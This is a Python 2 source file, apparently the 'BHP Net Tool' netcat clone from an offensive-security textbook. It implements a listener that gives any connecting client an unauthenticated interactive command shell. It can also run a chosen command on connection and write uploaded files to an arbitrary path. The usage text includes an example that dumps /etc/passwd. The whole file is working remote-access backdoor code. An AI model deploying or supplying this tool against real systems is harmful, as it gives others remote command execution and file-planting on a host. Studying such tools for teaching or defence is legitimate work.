import sys
import getopt
import socket
import threading
import subprocess

listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: ncat.py -t target_host -p port"
    print """-l --listen
    - listen on [host]:[port] for
    incoming connections"""
    print """-e --execute=file_to_run - execute the given file upon
    receiving a connection"""
    print """-c --command
    - initialize a command shell"""
    print """-u --upload=destination - upon receiving connection upload a
    file and write to [destination]"""
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)

        while True:
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            buffer = raw_input("")
            buffer += "\n"

            client.send(buffer)
    except Exception as e:
        print '[*] Exeption! Exiting'
        #print(e)
        client.close()

def run_command(command):
    print "Command is %s"%command
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        print "Error regarding command %s"%command,
        print e
        output = "Failed to execute the command.\r\n"
    return output

def server_loop():
    global target
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if not len(target):
        target = "0.0.0.0"
    server.bind((target, port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, \
                args=(client_socket,))
        client_thread.start()

def handle_client(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        content = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                content += data
        try:
            file_descriptor = open(upload_destination, 'wb')
            file_descriptor.write(content)
            file_descriptor.close()
            client_socket.send("File uploaded successfully to %s.\r\n"%\
                    upload_destination)
        except:
            client_socket.send("Failed to upload the file to %s.\r\n"%\
                    upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        print "[*] entering command line mode"
        while True:
            client_socket.send("<BHP:#> ")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            output = run_command(cmd_buffer)
            client_socket.send(output)


def main():
    global listen           
    global command          
#    global upload           
    global execute
    global target
    global upload_destination
    global port

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
                ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
    if not listen and len(target) and port > 0 and port < 1<<16:
        buffer = sys.stdin.read()
        client_sender(buffer)
    if listen:
        print "[*] running server..."
        server_loop()

if __name__ == '__main__':
    main()
